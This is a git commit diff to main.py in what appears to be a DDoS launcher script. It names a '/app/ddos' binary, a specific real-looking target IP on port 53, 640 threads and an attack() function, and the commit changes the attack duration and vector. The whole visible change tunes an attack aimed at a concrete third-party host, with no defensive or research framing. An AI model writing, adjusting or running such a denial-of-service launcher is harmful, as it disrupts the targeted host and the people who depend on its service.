109096a14e4ea5aefe1433392f37f0b16aa2c75b
vipxofficial7773-blip <vipxofficial7773@gmail.com>
2026-04-17 07:57:54 +0530

    Update main.py

--- main.py
+++ main.py
@@ -7,9 +7,9 @@ import sys
 BINARY = "/app/ddos"
 TARGET_IP = "147.75.202.61"
 TARGET_PORT = "53"
-DURATION = "300"
+DURATION = "240"
 THREADS = "640"
-VECTOR = "2"
+VECTOR = "5"
 
 def attack():
     # Make binary executable
